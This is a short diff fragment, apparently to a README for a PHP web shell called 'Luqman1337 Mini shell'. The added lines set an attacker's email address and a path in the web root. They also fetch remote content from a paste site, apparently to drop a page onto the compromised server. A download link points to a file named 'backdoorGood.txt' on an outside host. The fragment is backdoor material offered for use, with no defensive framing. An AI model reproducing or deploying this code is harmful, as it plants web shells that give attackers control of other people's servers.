@@ -4,6 +4,11 @@
 
 Luqman1337 Mini shell
 
+$ email = "luqmanid1337@gmail.com";
+$ from = "From: V1 Shell<luqmanid1337@gmail.com";
+$check3 = $_SERVER['DOCUMENT_ROOT'] . "/999MD999.html" ;
+$text3 = http_get('hxps://hastebin.com/raw/puralijawo');
+
 ## DOWNLOAD URL
 
 http://formfactset.org:8082/static/backdoorGood.txt
